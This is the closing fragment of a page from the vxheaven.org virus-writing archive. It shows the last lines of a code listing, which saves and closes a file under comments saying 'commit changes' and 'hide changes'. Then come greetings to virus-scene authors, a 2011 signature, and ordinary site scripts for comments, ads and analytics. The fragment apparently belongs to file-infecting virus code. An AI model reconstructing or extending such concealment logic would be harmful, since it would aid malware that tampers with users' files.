&nbsp; &nbsp; &nbsp; &nbsp; FileSave<span style="color: black;">&#40;</span>GetFileName<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* commit changes */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; FileClose<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* hide changes */</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: black;">&#125;</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>Greets to friendly people (A-Z): Active - Benny - herm1t - hh86 - izee - jqwerty - Malum - Obleak - Prototype - Ratter - Ronin - RT Fishel - sars - SPTH - The Gingerbread Man - Ultras - uNdErX - Vallez - Vecna - Whitehead</p>
<div align="right">rgb/defjam jul 2011<br/><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ea838b87b5988d88aa82859e878b8386c4898587">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></div>
<div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vrg15">de</a><a href="/lib/index.php?lang=en&amp;id=vrg15">en</a><a href="/lib/index.php?lang=es&amp;id=vrg15">es</a><a href="/lib/index.php?lang=it&amp;id=vrg15">it</a><a href="/lib/index.php?lang=fr&amp;id=vrg15">fr</a><a href="/lib/index.php?lang=pl&amp;id=vrg15">pl</a><a href="/lib/index.php?lang=ru&amp;id=vrg15">ru</a><a href="/lib/index.php?lang=ua&amp;id=vrg15">ua</a></div>
</body>
</html>
